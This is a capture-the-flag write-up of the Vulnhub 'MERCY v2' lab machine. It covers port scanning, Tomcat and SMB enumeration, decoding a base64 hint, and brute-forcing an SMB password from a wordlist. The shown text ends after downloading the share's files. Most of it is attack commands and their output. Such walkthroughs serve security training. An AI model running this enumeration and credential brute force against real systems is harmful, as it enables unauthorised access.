---
title: Vulnhub - Digitalworld.local (MERCY v2)
categories: [Vulnhub, Linux]
date: 2022-02-08
tags: [tcp/139-445-smb/fileshare,port-knocking,tcp/80-http/web-app-cms-exploit,tcp/80-http/cms/tomcat,linux-priv-esc/cronjob ]
img_path: /Writeups/Vulnhub/Linux/Digitalworld.local (MERCY v2)/images/
image:
  src: Pasted%20image%2020220208040124.png
  width: 1000   # in pixels
  height: 200   # in pixels
---

# Recon

## NMAP Complete Scan

```
# Nmap 7.92 scan initiated Mon Feb  7 19:15:36 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/xml/_full_tcp_nmap.xml 192.168.110.19
Nmap scan report for 192.168.110.19
Host is up, received arp-response (0.00053s latency).
Scanned at 2022-02-07 19:15:50 +08 for 31s
Not shown: 65525 closed tcp ports (reset)
PORT     STATE    SERVICE     REASON         VERSION
22/tcp   filtered ssh         no-response
53/tcp   open     domain      syn-ack ttl 64 ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http        no-response
110/tcp  open     pop3        syn-ack ttl 64 Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114 fd64 1d28 7465 e1c8 8fde af46 c767
| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC
| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79
| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T
| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO
| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb
| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w
| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg
| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY
| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd
| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj
| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH
| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z
| z+3Va0s54XjQ2xICsn7tKrg=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE PIPELINING STLS SASL UIDL CAPA TOP
139/tcp  open     netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        syn-ack ttl 64 Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more IMAP4rev1 IDLE capabilities have SASL-IR OK ID STARTTLS LITERAL+ listed LOGIN-REFERRALS LOGINDISABLEDA0001 Pre-login post-login ENABLE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114 fd64 1d28 7465 e1c8 8fde af46 c767
| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC
| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79
| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T
| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO
| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb
| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w
| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg
| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY
| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd
| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj
| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH
| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z
| z+3Va0s54XjQ2xICsn7tKrg=
|_-----END CERTIFICATE-----
445/tcp  open     netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imap    syn-ack ttl 64 Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114 fd64 1d28 7465 e1c8 8fde af46 c767
| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC
| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79
| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T
| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO
| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb
| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w
| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg
| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY
| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd
| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj
| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH
| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z
| z+3Va0s54XjQ2xICsn7tKrg=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 IDLE capabilities more SASL-IR OK ID have LITERAL+ AUTH=PLAINA0001 LOGIN-REFERRALS listed Pre-login post-login ENABLE
995/tcp  open     ssl/pop3    syn-ack ttl 64 Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/emailAddress=root@localhost/organizationalUnitName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-08-24T13:22:55
| Not valid after:  2028-08-23T13:22:55
| MD5:   5114 fd64 1d28 7465 e1c8 8fde af46 c767
| SHA-1: b1d2 b496 ab16 ed59 df4e 396e 6aa4 94df e59f c991
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAJSmN2X0v1fgMA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA4MjQxMzIyNTVaFw0yODA4MjMxMzIyNTVaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAKu55qkWb82oRinbXM7yriNhM89K8G7qeuYC
| xvpaeScaIhX4T8+KDbA5+ekrkKba8Zw/8EYKD5zovZqjL9DbwE0dmDVR/zVUkV79
| 9kyqOejKzIPFj8yr2OgNhDSpIrX76aEMgxY4H4TffGX5AiT2F4gVsaAh24pEvN8T
| YMJpusrcslfkxvKCl1SV0BXkfLIbQW93SxYH3pgABMpcjLsunCXgzOY0mc+eAfKO
| Js/JwKQZvblphTQJTT0QBRGjXoKf/v4Ka6dLcNPZHV1ej/b6RxGNhqd7ZBtoqVMb
| TdCKz40EnBaOsyIZnlM0bs+coxok1N5x12WHBpzbf2yKIKdDHzUCAwEAAaNQME4w
| HQYDVR0OBBYEFHM5ygJg0U68O2+1Yzkmwy7p65/LMB8GA1UdIwQYMBaAFHM5ygJg
| 0U68O2+1Yzkmwy7p65/LMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AGPDeUWsmdzhE9pXcmmdQVs763g7iUHpFS12m+Vvj5wQWJxMYqvXV1HvDljZL/sY
| EapBfXl+U/vDswW+KUUqjAbC4z2tVIGU4Yqd48R/8S4pEQ/98DIyIlcS1RsBXlJd
| ELgFQ3CAG6XWvX3zgkkj8JYYBifUBNPuCtME2YFVHfs4D1M4KsDzW7i1iBtLaVPj
| zVy+MgJU1UZ11szaw6/C8HT+A/gf0zqIKXTECaHUENSaB0GMGqoh1HjL8sSHLGBH
| SgZqcBuJhD9VQ2IjbinG0eZErgTbG58xM2a+Eyq3nQ7CuAGq/+I3yxYGh6OSCr9Z
| z+3Va0s54XjQ2xICsn7tKrg=
|_-----END CERTIFICATE-----
|_pop3-capabilities: RESP-CODES AUTH-RESP-CODE PIPELINING USER SASL(PLAIN) UIDL CAPA TOP
|_ssl-date: TLS randomness does not represent time
8080/tcp open     http        syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
| http-robots.txt: 1 disallowed entry 
|_/tryharder/tryharder
MAC Address: 08:00:27:CC:62:BC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/7%OT=53%CT=1%CU=43153%PV=Y%DS=1%DC=D%G=Y%M=080027%TM
OS:=6200FF85%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=I%II=I%
OS:TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 0.005 days (since Mon Feb  7 19:09:23 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: MERCY; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 5h19m58s, deviation: 4h37m07s, median: 7h59m57s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20630/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 22633/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 41049/udp): CLEAN (Timeout)
|   Check 4 (port 56145/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2022-02-07T19:16:08
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: MERCY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   MERCY<00>            Flags: <unique><active>
|   MERCY<03>            Flags: <unique><active>
|   MERCY<20>            Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: mercy
|   NetBIOS computer name: MERCY\x00
|   Domain name: \x00
|   FQDN: mercy
|_  System time: 2022-02-08T03:16:08+08:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.110.19

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb  7 19:16:21 2022 -- 1 IP address (1 host up) scanned in 45.90 seconds
```

## TCP/8080 (HTTP)

### FFUF - common.txt

```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
└─# ffuf -u http://$ip:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.19:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 1895, Words: 201, Lines: 30]
docs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1]
index.html              [Status: 200, Size: 1895, Words: 201, Lines: 30]
index.html              [Status: 200, Size: 1895, Words: 201, Lines: 30]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
robots.txt              [Status: 200, Size: 45, Words: 3, Lines: 3]
:: Progress: [18460/18460] :: Job [1/1] :: 2658 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

- `host-manager`
- `robots.txt`
- `manager`

### Nikto

```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
└─# nikto -ask=no -h http://192.168.110.19:8080 2>&1 | tee "/root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/tcp8080/tcp_8080_http_nikto.txt"
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.19
+ Target Hostname:    192.168.110.19
+ Target Port:        8080
+ Start Time:         2022-02-07 20:44:59 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ 8222 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2022-02-07 20:45:18 (GMT8) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

- `tomcat`CMS

## TCP/139,445 (SMB)

### Enum4linux

```
 ---------------------------------------
|    Users via RPC on 192.168.110.19    |
 ---------------------------------------
[*] Enumerating users via 'querydispinfo'
[+] Found 2 users via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 users via 'enumdomusers'
[+] After merging user results we have 2 users total:
'1000':
  username: pleadformercy
  name: QIU
  acb: '0x00000010'
  description: ''
'1001':
  username: qiu
  name: ''
  acb: '0x00000010'
  description: ''
```

- Usernames
	- `pleadformercy`
	- `qiu`

### Crackmapexec

```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
└─# crackmapexec smb $ip -u 'guest' -p '' --shares
SMB         192.168.110.19  445    MERCY            [*] Windows 6.1 (name:MERCY) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.110.19  445    MERCY            [+] \guest: 
SMB         192.168.110.19  445    MERCY            [+] Enumerated shares
SMB         192.168.110.19  445    MERCY            Share           Permissions     Remark
SMB         192.168.110.19  445    MERCY            -----           -----------     ------
SMB         192.168.110.19  445    MERCY            print$                          Printer Drivers
SMB         192.168.110.19  445    MERCY            qiu                             
SMB         192.168.110.19  445    MERCY            IPC$                            IPC Service (MERCY server (Samba, Ubuntu))
```

- `qiu` - NO ACCESS

### SMBMap

```
┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
└─# smbmap -u '' -p '' -H $ip
[+] Guest session   	IP: 192.168.110.19:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	qiu                                               	NO ACCESS	
	IPC$                                              	NO ACCESS	IPC Service (MERCY server (Samba, Ubuntu))
```

- `qiu` - NO ACCESS

# Initial Foothold

## TCP/8080 (HTTP) - Hidden Directory

1. View enumerated directories
	- `examples`
		![](Pasted%20image%2020220207205610.png)
		- contains example servlets and JSPs.
	- `index.html`
	![](Pasted%20image%2020220207200720.png)
	- `host-manager`
		![](Pasted%20image%2020220207205141.png)
		- Basic Authentication
	- `robots.txt`

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
		└─# curl http://$ip:8080/robots.txt
		User-agent: *
		Disallow: /tryharder/tryharder
		```

	- `/tryharder/tryharder`

		```
		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
		└─# curl http://$ip:8080/tryharder/tryharder
		SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
		```

2. Decode the encoded message from `/tryharder/tryharder`

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
	└─# curl -s http://$ip:8080/tryharder/tryharder | base64 -d | tee decoded.txt
	It's annoying, but we repeat this over and over again: cyber hygiene is extremely important. Please stop setting silly passwords that will get cracked with any decent password list.

	Once, we found the password "password", quite literally sticking on a post-it in front of an employee's desk! As silly as it may be, the employee pleaded for mercy when we threatened to fire her.

	No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
	```

	- Weak passwords?
3. Bruteforce `host-manager` w/ known tomcat default credentials
	- Failed
	![](Pasted%20image%2020220207211845.png)

## TCP/139,445 (SMB) SMB Fileshare Bruteforce

1. [Bruteforce](https://github.com/yufongg/SMB-Fileshare-Bruteforce) SMB Fileshare
	![](vmware_rITV3mj9PE.gif)

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
	└─# ./smb_bruteforce.sh $ip qiu /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt qiu
	Try: qiu + 123456
	Try: qiu + password
	Found Valid Combination qiu:password
	Try: qiu + 12345678
	Try: qiu + 1234
	Try: qiu + pussy
	Try: qiu + 12345
	Try: qiu + dragon
	Try: qiu + qwerty
	
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
	└─# cat Results.txt 
	qiu:password
	```

2. View SMB Fileshares

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
	└─# smbmap -H $ip -u 'qiu' -p 'password'
	[+] IP: 192.168.110.19:445	Name: unknown                                           
			Disk                                                  	Permissions	Comment
		----                                                  	-----------	-------
		print$                                            	READ ONLY	Printer Drivers
		qiu                                               	READ ONLY	
		IPC$                                              	NO ACCESS	IPC Service (MERCY server (Samba, Ubuntu))
	```

	- `qiu` - READ ONLY
3. Download all files from `qiu` fileshare

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
	└─# smbclient //$ip/qiu -U qiu -c 'prompt;recurse;mget *'
	Enter WORKGROUP\qiu's password: 
	getting file \.bashrc of size 3637 as .bashrc (5.7 KiloBytes/sec) (average 5.7 KiloBytes/sec)
	getting file \.bash_history of size 163 as .bash_history (19.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)
	getting file \.bash_logout of size 220 as .bash_logout (19.5 KiloBytes/sec) (average 6.1 KiloBytes/sec)
	getting file \.profile of size 675 as .profile (329.6 KiloBytes/sec) (average 7.1 KiloBytes/sec)
	getting file \.cache\motd.legal-displayed of size 0 as .cache/motd.legal-displayed (0.0 KiloBytes/sec) (average 7.1 KiloBytes/sec)
	getting file \.private\readme.txt of size 94 as .private/readme.txt (45.9 KiloBytes/sec) (average 7.2 KiloBytes/sec)
	getting file \.public\resources\smiley of size 54 as .public/resources/smiley (2.4 KiloBytes/sec) (average 7.1 KiloBytes/sec)
	getting file \.private\opensesame\configprint of size 539 as .private/opensesame/configprint (263.2 KiloBytes/sec) (average 7.8 KiloBytes/sec)
	getting file \.private\opensesame\config of size 17543 as .private/opensesame/config (552.6 KiloBytes/sec) (average 31.9 KiloBytes/sec)
	```

4. View directory structure

	```
	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
	└─# tree -a smb/
	smb/
	├── .bash_history
	├── .bash_logout
	├── .bashrc
	├── .cache
	│   └── motd.legal-displayed
	├── .private
	│   ├── opensesame
	│   │   ├── config
	│   │   └── configprint
	│   ├── readme.txt
	│   └── secrets
	├── .profile
	└── .public
		└── resources
			└── smiley
	6 directories, 9 files
	```

